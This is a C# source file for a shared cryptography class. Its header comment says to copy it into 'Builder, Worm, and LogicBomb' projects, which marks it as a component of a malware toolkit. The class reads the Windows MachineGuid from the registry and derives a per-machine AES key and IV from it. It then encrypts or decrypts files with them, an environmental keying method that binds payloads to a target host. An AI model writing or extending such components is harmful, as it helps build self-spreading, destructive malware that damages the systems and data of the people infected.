using System;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

/// <summary>
/// Shared cryptographic utilities for polymorphic key generation
/// Copy this class into each project: Builder, Worm, and LogicBomb
/// </summary>
namespace SharedCrypto
{
    public static class CryptoUtils
    {
        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
        private const string IV_SALT = "_IV_SALT_2025";

        /// <summary>
        /// Gets the Machine GUID from Windows Registry
        /// Fallback to DEFAULT_MACHINE_ID if not found
        /// </summary>
        public static string GetMachineGuid()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                {
                    if (key != null)
                    {
                        object guidValue = key.GetValue("MachineGuid");
                        if (guidValue != null)
                        {
                            string guid = guidValue.ToString();
                            if (!string.IsNullOrEmpty(guid))
                            {
                                Console.WriteLine($"[CryptoUtils] Machine GUID retrieved: {guid}");
                                return guid;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
            }

            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
            return DEFAULT_MACHINE_ID;
        }

        /// <summary>
        /// Derives a 32-byte AES key from a machine identifier
        /// </summary>
        public static byte[] DeriveKeyFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
                byte[] hash = sha.ComputeHash(inputBytes);

                // AES-256 requires 32 bytes
                byte[] key = new byte[32];
                Array.Copy(hash, key, 32);

                return key;
            }
        }

        /// <summary>
        /// Derives a 16-byte AES IV from a machine identifier
        /// Uses a salt to ensure IV is different from key
        /// </summary>
        public static byte[] DeriveIVFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
                byte[] hash = sha.ComputeHash(inputBytes);

                // AES IV requires 16 bytes
                byte[] iv = new byte[16];
                Array.Copy(hash, iv, 16);

                return iv;
            }
        }

        /// <summary>
        /// Gets both key and IV for a given machine ID
        /// </summary>
        public static void DeriveKeysFromMachineId(string machineId, out byte[] key, out byte[] iv)
        {
            key = DeriveKeyFromMachineId(machineId);
            iv = DeriveIVFromMachineId(machineId);
        }

        /// <summary>
        /// Encrypts a file using AES with keys derived from machine ID
        /// </summary>
        public static void EncryptFile(string inputFile, string outputFile, string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (System.IO.FileStream fsInput = new System.IO.FileStream(inputFile, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                using (System.IO.FileStream fsOutput = new System.IO.FileStream(outputFile, System.IO.FileMode.Create, System.IO.FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    fsInput.CopyTo(cs);
                }
            }
        }

        /// <summary>
        /// Decrypts a file using AES with keys derived from machine ID
        /// </summary>
        public static void DecryptFile(string inputFile, string outputFile, string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (System.IO.FileStream fsInput = new System.IO.FileStream(inputFile, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                using (System.IO.FileStream fsOutput = new System.IO.FileStream(outputFile, System.IO.FileMode.Create, System.IO.FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.CopyTo(fsOutput);
                }
            }
        }

        /// <summary>
        /// Displays derived key information for debugging/logging
        /// </summary>
        public static void LogDerivedKeys(string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            Console.WriteLine($"[CryptoUtils] Machine ID: {machineId}");
            Console.WriteLine($"[CryptoUtils] Derived Key: {BitConverter.ToString(key).Replace("-", "")}");
            Console.WriteLine($"[CryptoUtils] Derived IV:  {BitConverter.ToString(iv).Replace("-", "")}");
        }
    }
}